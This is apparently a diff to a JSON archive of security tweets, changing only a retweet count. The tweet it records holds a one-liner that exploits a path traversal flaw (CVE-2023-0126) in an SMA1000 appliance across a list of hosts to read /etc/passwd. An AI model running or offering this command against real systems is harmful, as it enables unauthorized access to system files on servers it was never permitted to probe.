@@ -51,7 +51,7 @@
     "tweetfavorites": 127,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 32,
+    "tweetretweets": 33,
     "tweettext": "CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000\n\nOne Liner\ncat file.txt| while read host do;do curl -sk \"http://$host:8443/images//////////////////../../../../../../../../etc/passwd\" | grep -i 'root:' &amp;&amp; echo $host \"is VULN\";done\n\n#bugbountytips #bug #CVE https://t.co/shFnrXWTX5",
     "tweettime": "2023-09-28, 05:36:57",
     "tweeturl": "https://twitter.com/thecybertix/status/1707268135907475495",
